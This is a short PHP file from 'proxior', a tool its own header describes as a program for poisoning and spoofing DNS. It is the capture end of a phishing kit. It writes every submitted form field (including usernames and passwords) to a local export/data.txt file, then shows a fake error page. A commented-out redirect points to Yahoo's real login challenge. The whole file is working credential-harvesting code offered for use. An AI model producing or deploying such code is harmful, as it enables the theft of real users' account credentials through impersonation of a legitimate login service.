<?php 

/*
*  Copyright (c) 2019 Barchampas Gerasimos <makindosx@gmail.com>.
*  proxior is a program for poisoning and spoofing dns.
*
*  proxior is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  proxior is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/

$path = getcwd();

$path = substr($path,0,17);

$file = $path ."/export/data.txt";

file_put_contents($file, print_r($_POST, true), FILE_APPEND);

?>

<!-- <meta http-equiv="refresh" content="0; url=https://login.yahoo.com/account/challenge/username?done=https%3A%2F%2Fwww.yahoo.com%2F&lang=el-GR&authMechanism=secondary&yid=&s=Qg--&c=3_quVLL.2bJsZtLUxcRtiVxNV3QauntAymJJDF8Qo8K.IaDURvkYjZ2U.VZtYduNcAOpIAj.TF5QRN5.uENrS5.sjyGqVnGDJUKnnf7rPMn1OWoB7E84cmdauv7v_U_RBDSeCurZ8NhaAeo4rQzL8hlfng5Yt5cB.JEuGoDU.jyP978y7oXwAfUwedqdDM62aOa740x1VhTcwXaD4dh1aB8jaKHjUGwpCXyG4yA8VvYLF.Fc~A"/> -->


<html>
<head>
</head>
<body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
</body>
</html>
